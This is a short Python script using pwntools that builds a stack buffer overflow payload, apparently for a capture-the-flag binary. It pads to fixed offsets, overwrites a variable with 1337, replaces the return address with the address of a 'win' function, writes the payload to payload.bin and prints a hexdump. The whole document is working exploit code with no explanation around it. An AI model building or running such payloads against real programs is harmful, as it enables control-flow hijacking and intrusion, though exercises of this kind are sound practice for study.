from pwn import *

offset_pwd = 16
offset_ret = 88
win_addr = 0x4011c4

payload = b"A" * offset_pwd
payload += p32(1337)
payload = payload.ljust(offset_ret, b"B")
payload += p64(win_addr)

with open("payload.bin", "wb") as f:
    f.write(payload)

print("[+] Payload written to payload.bin")
print(hexdump(payload))
